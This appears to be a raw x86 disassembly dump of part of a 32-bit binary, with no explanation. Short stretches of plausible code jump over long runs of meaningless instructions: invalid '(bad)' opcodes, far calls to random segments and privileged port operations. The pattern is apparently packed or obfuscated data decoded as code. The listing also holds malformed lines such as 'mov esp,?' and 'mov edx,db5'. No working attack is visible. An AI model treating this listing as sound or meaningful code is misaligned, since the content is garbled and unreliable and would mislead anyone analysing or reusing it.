  40c38d:	mov    DWORD PTR [edx],eax
  40c38f:	mov    eax,DWORD PTR [ebp-0x18]
  40c392:	mov    edx,DWORD PTR [ebp-0x14]
  40c395:	shrd   eax,edx,0x2
  40c399:	shr    edx,0x2
  40c39c:	mov    edx,DWORD PTR [ebp-0x18]
  40c39f:	mov    esi,DWORD PTR [ebp-0x14]
  40c3a2:	xor    eax,ecx
  40c3a4:	xor    esi,esi
  40c3a6:	or     eax,esi
  40c3a8:	mov    ds:0x42272c,eax
  40c3ad:	mov    BYTE PTR [ebp-0x2],0x4f
  40c3b1:	mov    BYTE PTR [ebp-0x1],0xf9
  40c3b5:	movzx  eax,BYTE PTR [ebp-0x1]
  40c3b9:	shl    edx,0x1e
  40c3bc:	mov    dl,BYTE PTR [ebp-0x2]
  40c3bf:	jmp    0x40c7b5
  40c3c4:	(bad)  
  40c3c5:	xor    al,0x5b
  40c3c7:	mov    dl,0x5b
  40c3c9:	call   0x6af2:0x3fac243e
  40c3d0:	pop    esi
  40c3d1:	push   ds
  40c3d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3d3:	mov    esp,0x1818fd0d
  40c3d8:	outs   dx,BYTE PTR ds:[esi]
  40c3d9:	adc    bl,BYTE PTR [eax]
  40c3db:	sbb    BYTE PTR [eax+0x47],ch
  40c3de:	push   esi
  40c3df:	loope  0x40c373
  40c3e1:	mov    ebp,ecx
  40c3e3:	(bad)  
  40c3e4:	loopne 0x40c432
  40c3e6:	xchg   esp,eax
  40c3e7:	sbb    eax,0x1681c419
  40c3ec:	and    al,0x53
  40c3ee:	mov    ebx,0x1eec0072
  40c3f3:	pop    ecx
  40c3f4:	jge    0x40c45a
  40c3f6:	js     0x40c452
  40c3f8:	fs dec eax
  40c3fa:	int    0x55
  40c3fc:	jl     0x40c39a
  40c3fe:	xchg   edi,eax
  40c3ff:	adc    ecx,DWORD PTR [ebx]
  40c401:	xor    BYTE PTR [eax+0x62],dh
  40c404:	call   0x917a:0x5e106045
  40c40b:	add    DWORD PTR [edx-0x5bb981fc],0x76410847
  40c415:	repz pop esp
  40c417:	xlat   BYTE PTR ds:[ebx]
  40c418:	mov    bh,0xc0
  40c41a:	and    BYTE PTR [eax+0x41],ah
  40c41d:	out    dx,al
  40c41e:	cmp    BYTE PTR [ecx+0x55965416],bl
  40c424:	sub    ah,BYTE PTR [ecx-0x38]
  40c427:	into   
  40c428:	mov    cl,0x81
  40c42a:	push   ds
  40c42b:	sbb    BYTE PTR [ebx],dl
  40c42d:	imul   edi,DWORD PTR [ebp+ecx*1+0x6273891d],0xdf55231
  40c438:	adc    eax,0x129f09c6
  40c43d:	mov    edi,0x58732ecb
  40c442:	sub    edi,DWORD PTR [esi-0x5b]
  40c445:	pop    ebx
  40c446:	mov    ds:0xf7182b7,eax
  40c44b:	shl    eax,1
  40c44d:	leave  
  40c44e:	inc    esp
  40c44f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c450:	cmp    DWORD PTR [edi],ecx
  40c452:	inc    ebx
  40c453:	test   esi,ebp
  40c455:	push   eax
  40c456:	mov    ss,WORD PTR [edi]
  40c458:	imul   ebx,ecx,0xbc7a98a
  40c45e:	fisttp WORD PTR [edx-0x27]
  40c461:	sar    DWORD PTR [eax+0x196c2b14],1
  40c467:	mov    BYTE PTR [edx+0x51bea8a4],cl
  40c46d:	cld    
  40c46e:	sar    BYTE PTR [ecx+0x29],cl
  40c471:	or     eax,0x18e4535f
  40c476:	xor    ebx,ebx
  40c478:	jmp    0x36f6:0x72c5ad66
  40c47f:	push   cs
  40c480:	(bad)  
  40c481:	or     BYTE PTR [edi+0x67],0x93
  40c485:	addr16 data16 lahf 
  40c488:	shl    esi,1
  40c48a:	cli    
  40c48b:	popa   
  40c48c:	add    cl,BYTE PTR [ebp-0x1]
  40c48f:	imul   edx,DWORD PTR [edx-0x3],0xa5faacef
  40c496:	test   al,0x4e
  40c498:	sbb    DWORD PTR [eax-0x6c],esp
  40c49b:	int3   
  40c49c:	in     eax,dx
  40c49d:	loope  0x40c519
  40c49f:	mov    eax,ds:0x8e0b8c24
  40c4a4:	retf   
  40c4a5:	test   BYTE PTR ds:0x21e5f37d,cl
  40c4ab:	inc    esi
  40c4ac:	dec    esi
  40c4ad:	xor    bh,BYTE PTR [edx-0x3e]
  40c4b0:	mov    edi,0x386d67fc
  40c4b5:	icebp  
  40c4b6:	sub    ecx,DWORD PTR [ecx]
  40c4b8:	jecxz  0x40c475
  40c4ba:	push   esi
  40c4bb:	sub    al,0x9a
  40c4bd:	push   ecx
  40c4be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4bf:	stos   DWORD PTR es:[edi],eax
  40c4c0:	out    0xf,eax
  40c4c2:	add    ebp,DWORD PTR [edx]
  40c4c4:	icebp  
  40c4c5:	push   es
  40c4c6:	or     al,0x1f
  40c4c8:	loopne 0x40c480
  40c4ca:	inc    ebx
  40c4cb:	pop    esi
  40c4cc:	ror    dh,0xd6
  40c4cf:	loopne 0x40c4fa
  40c4d1:	in     al,0x8
  40c4d3:	cli    
  40c4d4:	stc    
  40c4d5:	(bad)  
  40c4d6:	mov    ebx,0xf8bffcf3
  40c4db:	pop    ecx
  40c4dc:	leave  
  40c4dd:	cmp    eax,DWORD PTR [ecx]
  40c4df:	sti    
  40c4e0:	loop   0x40c4cd
  40c4e2:	mov    eax,ds:0x6688bd9b
  40c4e7:	cwde   
  40c4e8:	arpl   WORD PTR [ebp-0x7f],si
  40c4eb:	sub    al,0x62
  40c4ed:	xchg   esp,eax
  40c4ee:	ins    BYTE PTR es:[edi],dx
  40c4ef:	jno    0x40c56a
  40c4f1:	sub    edx,DWORD PTR [esi-0x49]
  40c4f4:	cmp    DWORD PTR ds:0x1acf782,ebp
  40c4fa:	mov    ds:0x12f20040,eax
  40c4ff:	cmp    DWORD PTR [ebp-0x78],0xffffff80
  40c503:	push   edi
  40c504:	les    eax,FWORD PTR [esi+0xba49343]
  40c50a:	xchg   ecx,eax
  40c50b:	adc    eax,0x6cced538
  40c510:	mov    ebx,DWORD PTR [eax]
  40c512:	add    BYTE PTR [esi*1+0x32c7e3a9],0x30
  40c51a:	pop    ebp
  40c51b:	retf   0xec70
  40c51e:	jle    0x40c548
  40c520:	xchg   esi,eax
  40c521:	dec    ecx
  40c522:	pusha  
  40c523:	into   
  40c524:	xchg   ecx,eax
  40c525:	pop    edx
  40c526:	dec    eax
  40c527:	sub    eax,0xc51b2c6e
  40c52c:	pop    ds
  40c52d:	add    ah,BYTE PTR [eax-0x1ef36770]
  40c533:	xor    DWORD PTR [edi-0x4ca4b566],ebp
  40c539:	push   eax
  40c53a:	call   0xd24b3b25
  40c53f:	pop    edi
  40c540:	bound  edx,QWORD PTR fs:[ecx]
  40c543:	in     al,dx
  40c544:	imul   eax,DWORD PTR [ebx-0x56],0xd37123be
  40c54b:	mov    DWORD PTR [esi-0x74],edx
  40c54e:	test   eax,0xa6c2c78d
  40c553:	sbb    al,0x18
  40c555:	push   edx
  40c556:	add    esi,DWORD PTR [ebp+0x94ae006]
  40c55c:	clc    
  40c55d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c55e:	in     al,dx
  40c55f:	fst    QWORD PTR [eax-0x9]
  40c562:	fisttp DWORD PTR [edi]
  40c564:	(bad)  
  40c565:	or     eax,0x2a1a3e20
  40c56a:	cdq    
  40c56b:	or     al,0x32
  40c56d:	mov    ds:0x3b7320cf,eax
  40c572:	fild   QWORD PTR gs:[ecx]
  40c575:	inc    edx
  40c576:	mov    eax,0x5235e56e
  40c57b:	mov    al,0x59
  40c57d:	repnz retf 0x86c8
  40c581:	out    0x2d,al
  40c583:	fld    st(3)
  40c585:	(bad)  
  40c586:	imul   edi,esi,0x7a
  40c589:	dec    eax
  40c58a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c58b:	or     eax,0xd2a54b84
  40c590:	stc    
  40c591:	in     al,0x25
  40c593:	fwait
  40c594:	stos   DWORD PTR es:[edi],eax
  40c595:	loope  0x40c5b5
  40c597:	cmp    DWORD PTR [ecx],ecx
  40c599:	xor    eax,ebx
  40c59b:	outs   dx,BYTE PTR ds:[esi]
  40c59c:	xchg   esp,eax
  40c59d:	imul   edi,ebx,0x7cca684e
  40c5a3:	stos   DWORD PTR es:[edi],eax
  40c5a4:	mov    eax,0xf1a0cb43
  40c5a9:	stc    
  40c5aa:	sub    al,0xa9
  40c5ac:	ins    BYTE PTR es:[edi],dx
  40c5ad:	scas   eax,DWORD PTR es:[edi]
  40c5ae:	lahf   
  40c5af:	cdq    
  40c5b0:	aaa    
  40c5b1:	cmp    eax,0x50dfdbd0
  40c5b6:	push   0xffffffe8
  40c5b8:	repz clc 
  40c5ba:	ficom  WORD PTR [ebp-0x58]
  40c5bd:	test   al,0xb0
  40c5bf:	imul   edx,DWORD PTR [ecx+0x2],0xffffffb4
  40c5c3:	lock dec ebx
  40c5c5:	outs   dx,DWORD PTR ds:[esi]
  40c5c6:	adc    BYTE PTR [ebp+eiz*1+0x7c72095a],bh
  40c5cd:	pop    ds
  40c5ce:	adc    al,0x18
  40c5d0:	dec    ecx
  40c5d1:	lahf   
  40c5d2:	test   BYTE PTR ds:[edx-0x78],0x53
  40c5d7:	jno    0x40c600
  40c5d9:	sar    BYTE PTR [edx+0x546ed21e],cl
  40c5df:	inc    ecx
  40c5e0:	hlt    
  40c5e1:	xor    bl,BYTE PTR [edx+edi*4]
  40c5e4:	inc    BYTE PTR [ecx+0x2f]
  40c5e7:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40c5e9:	cmp    eax,0x380a7abb
  40c5ee:	jge    0x40c5a6
  40c5f0:	cmp    DWORD PTR [edx-0x399dcab5],ecx
  40c5f6:	push   ecx
  40c5f7:	adc    al,0xd1
  40c5f9:	xchg   edi,eax
  40c5fa:	add    esp,esp
  40c5fc:	xchg   DWORD PTR [ecx],esi
  40c5fe:	or     dl,cl
  40c600:	dec    esi
  40c601:	out    dx,al
  40c602:	shl    BYTE PTR [ebp+0x57],0x3b
  40c606:	xchg   esi,eax
  40c607:	pop    eax
  40c608:	xchg   esp,eax
  40c609:	inc    esp
  40c60a:	mov    al,0x6d
  40c60c:	add    DWORD PTR [edx-0x64c4bf1f],esi
  40c612:	shr    BYTE PTR [ecx-0x78],0xc9
  40c616:	int3   
  40c617:	xor    al,0x1b
  40c619:	jg     0x40c63d
  40c61b:	jl     0x40c682
  40c61d:	loopne 0x40c5ef
  40c61f:	iret   
  40c620:	xchg   edi,eax
  40c621:	retf   0xb46a
  40c624:	int    0xbb
  40c626:	sub    al,0xb4
  40c628:	(bad)  
  40c62a:	hlt    
  40c62b:	mov    esp,0x7f6ba1d1
  40c630:	adc    al,0xac
  40c632:	jae    0x40c633
  40c634:	(bad)
  40c638:	nop
  40c639:	mov    ecx,0xde73716f
  40c63e:	adc    al,0x94
  40c640:	xchg   ebx,ecx
  40c642:	int    0x14
  40c644:	push   ebp
  40c645:	xchg   BYTE PTR [eax-0x5a],bh
  40c648:	retf   0xfe7e
  40c64b:	into   
  40c64c:	sbb    BYTE PTR [eax-0x332bf1a0],ch
  40c652:	int    0xc4
  40c654:	(bad)  
  40c655:	jmp    0x973f:0xd7092048
  40c65c:	pusha  
  40c65d:	sbb    eax,DWORD PTR [edi]
  40c65f:	repz jl 0x40c680
  40c662:	jp     0x40c66a
  40c664:	pop    ebx
  40c665:	les    ebx,FWORD PTR [eax+0x71246665]
  40c66b:	mov    WORD PTR [esi+0x407a47f2],sp
  40c672:	xor    cl,BYTE PTR [ebp-0x50c9aff1]
  40c678:	outs   dx,DWORD PTR ds:[esi]
  40c679:	adc    al,0x73
  40c67b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c67c:	dec    ebx
  40c67d:	jge    0x40c65c
  40c67f:	data16 jge 0x40c6d2
  40c682:	jecxz  0x40c6b9
  40c684:	call   0xe0e60948
  40c689:	into   
  40c68a:	scas   al,BYTE PTR es:[edi]
  40c68b:	push   edi
  40c68c:	loopne 0x40c6f7
  40c68e:	ret    
  40c68f:	adc    ebx,edx
  40c691:	(bad)  
  40c692:	cwde   
  40c693:	fldcw  WORD PTR es:[edx]
  40c696:	mov    ecx,esi
  40c698:	jne    0x40c711
  40c69a:	jns    0x40c709
  40c69c:	addr16 mov edx,edx
  40c69f:	arpl   ax,cx
  40c6a1:	xchg   ax,di
  40c6a4:	ss cmp eax,0xc35f6a5e
  40c6aa:	inc    edi
  40c6ab:	push   0x6e8b9c14
  40c6b0:	mov    bl,0xa5
  40c6b2:	pop    eax
  40c6b3:	call   0x930af9c8
  40c6b8:	fmul   DWORD PTR [esi+ebx*8]
  40c6bb:	mov    ah,0xbe
  40c6bd:	in     al,0x90
  40c6bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6c0:	mov    ah,0x6b
  40c6c2:	push   ss
  40c6c3:	lds    esp,FWORD PTR [ebp+0x1a6cb5a8]
  40c6c9:	fsub   DWORD PTR [ebp+0x28]
  40c6cc:	aas    
  40c6cd:	(bad)  
  40c6ce:	adc    al,0xb5
  40c6d0:	add    al,0x53
  40c6d2:	pop    ecx
  40c6d3:	jb     0x40c752
  40c6d5:	dec    edx
  40c6d6:	fs pop edi
  40c6d8:	adc    bh,BYTE PTR [edi-0x4d]
  40c6db:	pop    edi
  40c6dc:	jnp    0x40c75b
  40c6de:	sub    edx,ebp
  40c6e0:	lods   al,BYTE PTR ds:[esi]
  40c6e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6e2:	mov    al,ds:0x27800fa4
  40c6e7:	and    edx,ebp
  40c6e9:	sahf   
  40c6ea:	outs   dx,DWORD PTR ds:[esi]
  40c6eb:	cmp    edi,0xffffff9f
  40c6ee:	jo     0x40c6fb
  40c6f0:	push   eax
  40c6f1:	pop    es
  40c6f2:	int    0xf7
  40c6f4:	sbb    ah,ah
  40c6f6:	jl     0x40c691
  40c6f8:	repz cld 
  40c6fa:	pushf  
  40c6fb:	push   cs
  40c6fc:	test   DWORD PTR [edi-0x59],ebx
  40c6ff:	or     edx,0xe8bc9524
  40c705:	push   ss
  40c706:	hlt    
  40c707:	sub    BYTE PTR [edx],cl
  40c709:	fmul   QWORD PTR [edx-0x31]
  40c70c:	push   edx
  40c70d:	adc    BYTE PTR [ecx],0xe4
  40c710:	lahf   
  40c711:	cmp    edi,DWORD PTR [ecx]
  40c713:	es je  0x40c74b
  40c716:	mov    al,0x64
  40c718:	fwait
  40c719:	pop    edi
  40c71a:	mov    dl,0x79
  40c71c:	mov    ds:0x68f16e23,eax
  40c721:	test   eax,0x24baf256
  40c726:	and    bl,BYTE PTR [ecx-0x30503094]
  40c72c:	lods   al,BYTE PTR ds:[esi]
  40c72d:	aam    0x6d
  40c72f:	inc    esp
  40c730:	test   DWORD PTR [eax],esi
  40c732:	jp     0x40c75a
  40c734:	add    ecx,DWORD PTR [edi]
  40c736:	add    eax,0xddd7e384
  40c73b:	inc    ebp
  40c73c:	push   ds
  40c73d:	xchg   edi,eax
  40c73e:	stos   BYTE PTR es:[edi],al
  40c73f:	je     0x40c6d3
  40c741:	adc    DWORD PTR [ebp+esi*8-0x6e],eax
  40c745:	ficomp DWORD PTR [edx+0x37]
  40c748:	sar    DWORD PTR [edx],0x84
  40c74b:	pushf  
  40c74c:	inc    edx
  40c74d:	xchg   ecx,eax
  40c74e:	inc    esp
  40c74f:	pop    es
  40c750:	mov    ah,0x5f
  40c752:	std    
  40c753:	push   ss
  40c754:	xlat   BYTE PTR ds:[ebx]
  40c755:	shr    BYTE PTR [edx-0x1070d329],0x8c
  40c75c:	mov    al,BYTE PTR [edi+0x22]
  40c75f:	repz sbb BYTE PTR [edx],dh
  40c762:	xlat   BYTE PTR ds:[ebx]
  40c763:	push   edx
  40c764:	mov    cs,WORD PTR [eax+0x41]
  40c767:	addr16 inc eax
  40c769:	xor    BYTE PTR [eax+esi*1+0x2b],0xb9
  40c76e:	or     DWORD PTR [edi+0x31],ecx
  40c771:	cmp    eax,0x179861e1
  40c776:	jno    0x40c7cc
  40c778:	ins    BYTE PTR es:[edi],dx
  40c779:	dec    esi
  40c77a:	iret   
  40c77b:	pop    ss
  40c77c:	lds    edx,FWORD PTR [edx+0x4e]
  40c77f:	inc    esp
  40c780:	iret   
  40c781:	icebp  
  40c782:	xchg   ebp,eax
  40c783:	push   cs
  40c784:	out    dx,al
  40c785:	pushf  
  40c786:	cli    
  40c787:	in     al,dx
  40c788:	iret   
  40c789:	push   edi
  40c78a:	add    BYTE PTR [eax-0x347cb620],0x56
  40c791:	enter  0x9717,0xf9
  40c795:	sbb    BYTE PTR [edi+0x60f66bf],bl
  40c79b:	or     BYTE PTR [edi+0x2c],ch
  40c79e:	sahf   
  40c79f:	jno    0x40c769
  40c7a1:	das    
  40c7a2:	push   cs
  40c7a3:	pop    ebp
  40c7a4:	and    dh,BYTE PTR [esi+0x13]
  40c7a7:	fstp   DWORD PTR [eax+eiz*8-0x763e65a]
  40c7ae:	sbb    al,0xf6
  40c7b0:	adc    edi,DWORD PTR [ecx]
  40c7b2:	loope  0x40c808
  40c7b4:	scas   al,BYTE PTR es:[edi]
  40c7b5:	xor    al,0x42
  40c7b7:	add    al,dl
  40c7b9:	push   0x6
  40c7bb:	add    eax,0xfa
  40c7c0:	mov    BYTE PTR [ebp-0x4],al
  40c7c3:	mov    BYTE PTR [ebp-0x3],0x67
  40c7c7:	pop    eax
  40c7c8:	mov    BYTE PTR [ebp-0x1],al
  40c7cb:	mov    BYTE PTR [ebp-0x2],0x3
  40c7cf:	mov    dl,BYTE PTR [ebp-0x2]
  40c7d2:	movzx  esi,dl
  40c7d5:	cdq    
  40c7d6:	idiv   esi
  40c7d8:	mov    dl,BYTE PTR [ebp-0x1]
  40c7db:	add    al,dl
  40c7dd:	mov    dl,BYTE PTR [ebp-0x3]
  40c7e0:	or     al,dl
  40c7e2:	mov    dl,BYTE PTR [ebp-0x4]
  40c7e5:	add    al,0x3a
  40c7e7:	cmp    dl,al
  40c7e9:	jmp    0x40cbdf
  40c7ee:	xchg   esi,eax
  40c7ef:	and    al,dl
  40c7f1:	cmc    
  40c7f2:	mov    ds:0xdc222674,al
  40c7f7:	mov    cl,BYTE PTR [edi+0x31ce6a70]
  40c7fd:	mov    esi,0x1818f563
  40c802:	outs   dx,BYTE PTR ds:[esi]
  40c803:	adc    bl,BYTE PTR [eax]
  40c805:	sbb    BYTE PTR [eax],bh
  40c807:	push   es
  40c808:	jo     0x40c800
  40c80a:	mov    ebx,0x464aeeea
  40c80f:	mov    ebp,0xeb8316db
  40c814:	dec    esp
  40c815:	xchg   esp,eax
  40c816:	and    al,0x66
  40c818:	(bad)  
  40c819:	push   edi
  40c81a:	jge    0x40c7d0
  40c81c:	jecxz  0x40c7d4
  40c81e:	push   es
  40c81f:	aad    0x3d
  40c821:	sahf   
  40c822:	std    
  40c823:	sbb    DWORD PTR [ebx+0x2d553935],eax
  40c829:	lds    ebp,FWORD PTR [ecx-0xf361226]
  40c82f:	inc    edx
  40c830:	pop    eax
  40c831:	jbe    0x40c8aa
  40c833:	mov    al,0x1f
  40c835:	bound  ebp,QWORD PTR ds:0x1ca65e45
  40c83b:	fdiv   QWORD PTR [ebx]
  40c83d:	shl    DWORD PTR [ebp-0x3b],0x27
  40c841:	lea    ecx,[edi]
  40c843:	pop    ebx
  40c844:	xchg   esp,eax
  40c845:	shl    DWORD PTR [ebx+ecx*2-0x77],cl
  40c849:	jnp    0x40c88a
  40c84b:	mov    esp,?
  40c84d:	sub    BYTE PTR [esi+0x22],bh
  40c850:	pop    ebp
  40c851:	mov    edx,db5
  40c854:	cwde   
  40c855:	lds    ecx,FWORD PTR [ebx]
  40c857:	adc    al,0x48
  40c859:	js     0x40c847
  40c85b:	sub    dh,BYTE PTR [edi-0x64f55db1]
  40c861:	mov    ds:0x42e6afd8,al
  40c866:	adc    BYTE PTR [ebx+0x34],al
  40c869:	xchg   ebp,eax
  40c86a:	xchg   ebx,eax
  40c86b:	loop   0x40c8d3
  40c86d:	dec    ecx
  40c86e:	jae    0x40c86f
  40c870:	pop    es
  40c871:	out    dx,al
  40c872:	xlat   BYTE PTR ds:[ebx]
  40c873:	loopne 0x40c7ff
  40c875:	mov    edx,0x38e3f2e
  40c87a:	repz sbb eax,0x6b3490af
  40c880:	mov    cl,0x68
  40c882:	xchg   edx,eax
  40c883:	scas   eax,DWORD PTR es:[edi]
  40c884:	jge    0x40c861
  40c886:	add    cl,BYTE PTR [edi+0x15]
  40c889:	jne    0x40c84f
  40c88b:	aad    0xcb
  40c88d:	out    0x41,eax
  40c88f:	jo     0x40c8c8
  40c891:	and    bh,BYTE PTR [edx]
  40c893:	mov    edi,0x53261027
  40c898:	test   al,0xc9
  40c89a:	pop    ss
  40c89b:	push   ds
  40c89c:	or     ch,BYTE PTR [eax-0x770beb49]
  40c8a2:	mov    bl,0x80
  40c8a4:	push   edx
  40c8a5:	push   ebp
  40c8a6:	mov    dl,0x21
  40c8a8:	das    
  40c8a9:	mov    ds,WORD PTR ds:[ebx-0x4fd9b8c2]
  40c8b0:	dec    eax
  40c8b1:	jno    0x40c874
  40c8b3:	(bad)  
  40c8b4:	out    0xb8,eax
  40c8b6:	pop    ecx
  40c8b7:	push   ecx
  40c8b8:	in     al,dx
  40c8b9:	retf   0xdf9c
  40c8bc:	test   BYTE PTR ds:0xf7ea14a,bh
  40c8c2:	xchg   esi,eax
  40c8c3:	inc    ebx
  40c8c4:	and    al,0xfb
  40c8c6:	push   esi
  40c8c7:	mov    edi,0x46f57d6f
  40c8cc:	test   al,0x19
  40c8ce:	xchg   ecx,eax
  40c8cf:	or     BYTE PTR [ecx],dl
  40c8d1:	test   dh,bl
  40c8d3:	xchg   esi,eax
  40c8d4:	sbb    edx,DWORD PTR ss:[ebp+0x11171f60]
  40c8db:	jbe    0x40c86e
  40c8dd:	xchg   ebx,eax
  40c8de:	(bad)  
  40c8df:	or     BYTE PTR [eax+0x48071fbb],dl
  40c8e5:	xchg   ecx,eax
  40c8e6:	dec    eax
  40c8e7:	push   esi
  40c8e8:	mov    eax,ds:0xac4341ed
  40c8ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8ee:	jge    0x40c8b1
  40c8f0:	pop    ecx
  40c8f1:	je     0x40c8fa
  40c8f3:	vshufps ymm1,ymm4,YMMWORD PTR es:[esi+0x5b],0x85
  40c8fa:	jl     0x40c976
  40c8fc:	cmp    eax,0x78b01527
  40c901:	fild   QWORD PTR [ebx]
  40c903:	jl     0x40c97a
  40c905:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c906:	lock call 0x6627:0x4a562ecc
  40c90e:	cs jno 0x40c95c
  40c911:	out    dx,eax
  40c912:	cmc    
  40c913:	aam    0xd0
  40c915:	call   0xfb35:0xecabbbe8
  40c91c:	icebp  
  40c91d:	cmp    ebp,DWORD PTR [esi+0x6d]
  40c920:	xchg   ebp,eax
  40c921:	loopne 0x40c965
  40c923:	fisubr WORD PTR [esi+ebp*8+0x73]
  40c927:	mov    eax,0xcf4e68a2
  40c92c:	daa    
  40c92d:	dec    eax
  40c92e:	gs or  ecx,esi
  40c931:	add    eax,0xf3ccf4e6
  40c936:	adc    al,BYTE PTR [eax]
  40c938:	pop    ebp
  40c939:	or     BYTE PTR [esp+edi*8+0xe],0xc8
  40c93e:	mov    edi,0x19e18401
  40c943:	sub    DWORD PTR [ebx-0x70],esi
  40c946:	sub    bh,dl
  40c948:	fild   QWORD PTR [eax]
  40c94b:	xor    al,dl
  40c94d:	idiv   BYTE PTR [edx]
  40c94f:	mov    ch,0xa9
  40c951:	cs iret 
  40c953:	adc    dl,dl
  40c955:	not    DWORD PTR [eax-0x73912359]
  40c95b:	or     eax,0x2ad5f4ec
  40c960:	mov    cl,0x5f
  40c962:	outs   dx,BYTE PTR ds:[esi]
  40c963:	stos   DWORD PTR es:[edi],eax
  40c964:	sbb    dl,BYTE PTR [ecx]
  40c966:	cli    
  40c967:	jmp    0x40c9de
  40c969:	mov    ecx,0x2a905bc5
  40c96e:	push   esp
  40c96f:	sbb    bh,BYTE PTR [ecx-0x58]
  40c972:	add    al,0x9e
  40c975:	sub    dh,BYTE PTR [eax+ebp*8+0xd85bf66]
  40c97c:	sbb    BYTE PTR [ebp+0x3a],ch
  40c97f:	mov    WORD PTR [ecx+0x12],ds
  40c982:	jmp    0x799a5f71
  40c987:	dec    esi
  40c988:	(bad)  
  40c989:	cdq    
  40c98a:	push   0x3d
  40c98c:	inc    edi
  40c98d:	sub    al,0xf8
  40c98f:	lock mov ebx,0xabcc2c47
  40c995:	sub    DWORD PTR [ebp-0x52bb6ae3],esp
  40c99b:	push   ebp
  40c99c:	les    ebp,FWORD PTR [ebx+0x7f]
  40c99f:	cdq    
  40c9a0:	lods   al,BYTE PTR ds:[esi]
  40c9a1:	jns    0x40c932
  40c9a3:	xor    ebx,ebx
  40c9a5:	test   al,0xbb
  40c9a7:	pop    es
  40c9a8:	jnp    0x40ca23
  40c9aa:	sbb    al,0x4a
  40c9ac:	leave  
  40c9ad:	add    al,0xb3
  40c9af:	inc    ebx
  40c9b0:	ja     0x40c997
  40c9b2:	scas   al,BYTE PTR es:[edi]
  40c9b3:	jle    0x40ca19
  40c9b5:	xlat   BYTE PTR ds:[ebx]
  40c9b6:	push   0xffffffdf
  40c9b8:	fadd   QWORD PTR [ebp+0x11]
  40c9bb:	jl     0x40c9c4
  40c9bd:	(bad)  
  40c9be:	lock (bad) 
  40c9c0:	xlat   BYTE PTR ds:[ebx]
  40c9c1:	inc    edi
  40c9c2:	pop    ebp
  40c9c3:	cmp    DWORD PTR ds:0x9b90176a,ebp
  40c9c9:	cli    
  40c9ca:	jnp    0x40ca09
  40c9cc:	and    bh,ch
  40c9ce:	add    al,0xf4
  40c9d0:	cs push 0x35ece736
  40c9d6:	lahf   
  40c9d7:	jb     0x40ca3c
  40c9d9:	repz sub bh,dl
  40c9dc:	les    esp,FWORD PTR [edx]
  40c9de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9df:	dec    ebx
  40c9e0:	jno    0x40c9c5
  40c9e2:	jmp    0x1b74:0xf9ff6e91
  40c9e9:	sub    bl,BYTE PTR [ecx]
  40c9eb:	or     ebx,DWORD PTR [eax]
  40c9ed:	cmp    eax,0x380448d5
  40c9f2:	fldcw  WORD PTR [edx-0x215bbc8e]
  40c9f8:	out    dx,eax
  40c9f9:	pushf  
  40c9fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9fb:	mov    ebp,0xcd2852fe
  40ca00:	shr    DWORD PTR [ecx-0xc0773da],0x62
  40ca07:	ins    BYTE PTR es:[edi],dx
  40ca08:	jb     0x40ca21
  40ca0a:	outs   dx,DWORD PTR ds:[esi]
  40ca0b:	push   esi
  40ca0c:	lods   eax,DWORD PTR ds:[esi]
  40ca0d:	cmc    
  40ca0e:	imul   BYTE PTR [eax-0x17]
  40ca11:	xchg   ecx,eax
  40ca12:	sub    dl,bl
  40ca14:	xchg   edx,eax
  40ca15:	in     al,0x7e
  40ca17:	xor    BYTE PTR [esp+eiz*4],ch
  40ca1a:	jb     0x40ca7f
  40ca1c:	fmul   DWORD PTR [ebx]
  40ca1e:	loope  0x40c9e3
  40ca20:	mov    al,BYTE PTR ds:[ebp+esi*1-0x5a]
  40ca25:	loop   0x40ca51
  40ca27:	out    dx,al
  40ca28:	jbe    0x40c9d2
  40ca2a:	pusha  
  40ca2b:	(bad)  
  40ca2c:	push   eax
  40ca2d:	popa   
  40ca2e:	nop
  40ca2f:	inc    esp
  40ca30:	scas   eax,DWORD PTR es:[edi]
  40ca31:	cmc    
  40ca32:	jmp    0x96143299
  40ca37:	sub    ch,ch
  40ca39:	pusha  
  40ca3a:	mov    bh,0xa4
  40ca3c:	pop    edi
  40ca3d:	and    al,0xab
  40ca3f:	jae    0x40ca0c
  40ca41:	(bad)  
  40ca42:	scas   al,BYTE PTR es:[edi]
  40ca43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca45:	ds push esp
  40ca47:	and    DWORD PTR [ebp+ebp*8-0x5059fb25],eax
  40ca4e:	xchg   ebx,eax
  40ca4f:	test   eax,0xbc7c73f0
  40ca54:	(bad)  
  40ca55:	jg     0x40ca86
  40ca57:	in     eax,dx
  40ca58:	fcomp  DWORD PTR [edi+0x60]
  40ca5b:	inc    esp
  40ca5c:	xchg   ebx,eax
  40ca5d:	adc    BYTE PTR [ebp-0x39],0x53
  40ca61:	inc    eax
  40ca62:	sbb    BYTE PTR [esi],0xa9
  40ca65:	xor    ebx,DWORD PTR [ebx]
  40ca67:	(bad)  
  40ca68:	dec    esi
  40ca69:	adc    edi,0xfffffff4
  40ca6c:	pop    es
  40ca6d:	in     eax,dx
  40ca6e:	mov    cl,0x88
  40ca70:	mov    ebx,0x1d8f2504
  40ca75:	test   eax,0x30bb7db8
  40ca7a:	mov    bh,ah
  40ca7c:	jae    0x40ca5b
  40ca7e:	mov    DWORD PTR [edx+ebx*2-0x48],ecx
  40ca82:	mov    esp,0x1ac054a1
  40ca87:	pop    esi
  40ca88:	mov    ds:0x1cff1583,eax
  40ca8d:	out    dx,al
  40ca8e:	pop    es
  40ca8f:	loopne 0x40ca74
  40ca91:	lahf   
  40ca92:	jmp    0x40cac7
  40ca94:	(bad)  
  40ca95:	jo     0x40ca98
  40ca97:	push   ds
  40ca98:	fistp  DWORD PTR [ebp-0x5ef80cb7]
  40ca9e:	shr    DWORD PTR [eax+0x28],cl
